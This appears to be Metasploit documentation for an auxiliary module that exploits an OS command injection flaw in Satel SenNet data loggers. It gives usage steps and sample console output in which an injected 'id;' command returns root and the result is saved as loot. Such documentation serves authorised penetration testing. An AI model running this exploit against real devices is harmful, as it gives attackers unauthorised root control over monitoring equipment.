This module exploits an OS Command Injection vulnerability in Satel SenNet Data Loggers to perform arbitrary command execution as 'root'.

## Verification Steps

1. Do: ```use auxiliary/scanner/telnet/satel_cmd_exec```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Sample Output

  ```
msf > use auxiliary/scanner/telnet/satel_cmd_exec
msf auxiliary(satel_cmd_exec) > set rhosts 1.3.3.7
msf auxiliary(satel_cmd_exec) > run

[*] 1.3.3.7:5000   - Sending command now - id;
[+] 1.3.3.7:5000   - uid=0(root) gid=0(root)
[+] 1.3.3.7:5000   - File saved in: /root/.msf4/loot/20000000000004_1.3.3.7_cmdexeclog_528409.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
